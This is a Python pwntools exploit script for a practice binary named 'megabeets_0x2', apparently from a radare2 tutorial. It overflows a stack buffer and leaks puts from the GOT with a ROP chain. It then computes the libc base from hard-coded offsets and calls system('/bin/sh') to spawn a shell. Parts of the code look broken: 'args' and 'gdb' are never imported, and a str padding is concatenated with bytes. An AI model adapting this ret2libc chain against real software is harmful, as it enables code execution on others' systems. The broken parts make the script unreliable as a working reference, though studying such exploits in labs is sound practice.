#! /usr/bin/env python
import binascii
#
from pwn import log, remote, process, context, p32, u32, p64, u64
context.clear(arch='i386', os='linux')

"""
$ ragg2 -P 200 -r > pattern.txt
$ cat > profile.rr2 << EOF
#!/usr/bin/rarun2
stdin=./pattern.txt
EOF
$ r2 -r profile.rr2 -d megabeets_0x2
> dc
> wopO `dr eip`
"""

class ExploitInfo:
    name    = 'megabeets_0x2'
    gdb     = r"""
break *0x080485fe
continue
"""
    # Addresses
    puts_plt        = 0x8048390     # ?v sym.imp.puts
    puts_got        = 0x804a014     # ?v reloc.puts
    entry_point     = 0x080483d0    # ieq
    main_func       = 0x08048658

    # Offsets
    offset_puts     = 0x00067b40    # dmi libc puts~&GLOBAL
    offset_system   = 0x0003d200    # dmi libc system~&GLOBAL
    offset_exit     = 0x000303d0    # dmi libc exit~&GLOBAL
    offset_str_bin_sh = 0x17e0cf    # e search.in = dbg.maps; / /bin/sh
    offset_execl    = 0x000bf870

    offset_buf_to_eip = 140


def get_process():
    r = None
    if args.GDB:
        log.info("=> GDB run")
        r = process('./%s' % ExploitInfo.name)
        gdb.attach(r.pid, ExploitInfo.gdb)
    else:
        log.info("=> LOCAL run")
        r = process('./%s' % ExploitInfo.name)

    return r


def main():
    p = get_process()

    # Stage 1

    # Initial payload
    payload  =  b"A"*ExploitInfo.offset_buf_to_eip
    ropchain =  p32(ExploitInfo.puts_plt)
    ropchain += p32(ExploitInfo.main_func)
    ropchain += p32(ExploitInfo.puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    puts_addr = u32(leak)
    log.info("Here the leak : %s" % binascii.hexlify(leak))
    log.info("puts is at    : 0x%x" % puts_addr)
    p.clean()

    # Calculate libc base
    libc_base = puts_addr - ExploitInfo.offset_puts
    log.info("libc base     : 0x%x" % libc_base)

    # Stage 2
    # Calculate offsets
    system_addr = libc_base + ExploitInfo.offset_system + 3 # +3 to avoid null byte on address
    """
    Part of system:
        0xf7e0d200 <+0>:     sub    esp,0xc
        0xf7e0d203 <+3>:     mov    eax,DWORD PTR [esp+0x10]
        0xf7e0d207 <+7>:     call   0xf7f0737d
    """
    padding     = '\x90' * 0xc                  # cause we jump from first instruction
    exit_addr   = libc_base + ExploitInfo.offset_exit
    binsh_addr  = libc_base + ExploitInfo.offset_str_bin_sh

    log.info("system is at  : 0x%x" % system_addr)
    log.info("/bin/sh is at : 0x%x" % binsh_addr)
    log.info("exit is at    : 0x%x" % exit_addr)

    # Build 2nd payload
    payload2  =  b"A" * ExploitInfo.offset_buf_to_eip
    ropchain2 =  p32(system_addr)
    ropchain2 += padding
    ropchain2 += p32(exit_addr)
    # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)
    #           Then you'll execute system("sh")
    ropchain2 += p32(binsh_addr)

    payload2 = payload2 + ropchain2
    if b'\x00' in payload2:
        log.warn('WARNING: null in payload\n'
                 'Exploit may fail.')

    p.sendline(payload2)

    log.success("Here comes the shell!")
    p.clean()
    p.interactive()


if __name__ == "__main__":
    main()
